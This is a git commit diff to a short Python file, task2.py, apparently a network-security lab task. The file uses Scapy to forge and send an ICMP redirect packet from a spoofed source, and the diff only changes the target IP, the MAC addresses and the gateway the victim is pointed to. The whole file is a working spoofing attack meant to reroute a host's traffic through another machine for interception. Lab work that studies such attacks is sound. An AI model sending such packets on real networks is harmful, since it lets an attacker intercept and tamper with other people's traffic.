ec46c1d5213d3194e6d3ae6da3bb6c9ca2a41116
revanth5 <44646933+revanth5@users.noreply.github.com>
2018-11-25 17:56:52 +0000

    Add files via upload

--- task2.py
+++ task2.py
@@ -3,9 +3,9 @@ from scapy.all import *
 
 def main():
 	
-	dest_ip="192.168.0.1"
+	dest_ip="192.168.0.133"
 	src_ip="192.168.0.73"
-	dest_mac="38:43:7d:a9:0d:ae"
+	dest_mac="50:3e:aa:85:4e:9e"
 	src_mac="50:3e:aa:85:4e:9e"
 	send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac)
 
@@ -14,7 +14,7 @@ def main():
 def send_icmpRedirect_packet(src_ip,dest_ip,src_mac,dest_mac):
 	eth_h=Ether(src=src_mac,dst=dest_mac)
 	ip_h=IP(dst=dest_ip,src=src_ip)
-	icmp_h=ICMP(type=5,code=1,gw="192.168.0.1")
+	icmp_h=ICMP(type=5,code=1,gw="192.168.0.228")
 	pkt=eth_h/ip_h/icmp_h
 	sendp(pkt,iface="eth0") 
 
